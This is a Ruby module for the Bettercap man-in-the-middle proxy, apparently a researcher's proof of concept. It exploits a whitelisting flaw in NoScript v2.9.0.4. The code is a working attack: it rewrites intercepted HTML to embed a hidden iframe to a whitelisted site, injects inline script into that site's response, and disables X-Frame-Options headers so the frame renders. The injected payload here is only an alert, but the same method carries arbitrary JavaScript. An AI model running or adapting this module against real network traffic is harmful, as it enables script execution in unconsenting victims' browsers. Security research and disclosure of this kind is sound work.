=begin

BETTERCAP
Module: HackNoScript


Author    : Mazin Ahmed
Email  	  : mazin AT mazinahmed DOT net
Website   : https://mazinahmed.net

Description:- 
This module exploits an issue in NoScript v2.9.0.4. The module bypasses NoScritpt v2.9.0.4 default whitelisting settings, enabling attackers to execute unrestrected malicious JS on the vicitms' browsers using MITM attacks.

Affected Product:-
NoScript (https://noscript.net)

Affected Versions:-
The issue has been tested on v2.9.0.4, previous versions maybe vulnerable as well.


=end

class HackNoScript < BetterCap::Proxy::HTTP::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Modifying http://#{request.host}#{request.path}"
      # Forcing every unencrypted page to include an invisible iframe that points to [http://dvd.netflix.com/].
      response.body.sub!( '</title>', '</title> <iframe src="http://dvd.netflix.com/" style="display:none;"></iframe>')
      
      # Once the above request is done, the following will inject inline Javascript code on [http://dvd.netflix.com/] that bypasses NoScript default whitelisting settings. 
      response.body.sub!( '<div class="dvd-dot-com-logo" title="dvd.netflix.com - DVD Netflix" alt="dvd.netflix.com - DVD Netflix"></div>', '<div class="dvd-dot-com-logo" title="dvd.netflix.com - Netflix DVDs" alt="dvd.netflix.com - Netflix DVDs"></div> <script>alert("@mazen160");</script>' )

      # Disabling X-Frame-Options header, in order to allow the iframe to be rendered.
      for h in response.headers
        # Prevent Request loop
        if /^X-Frame-Options:/.match(h)
          BetterCap::Logger.info "Disabling X-Frame-Options on http://#{request.host}#{request.path}"
          h.replace('X-Frame-Options-Disabled: True')
	   
        end
      end
    end
  end
end
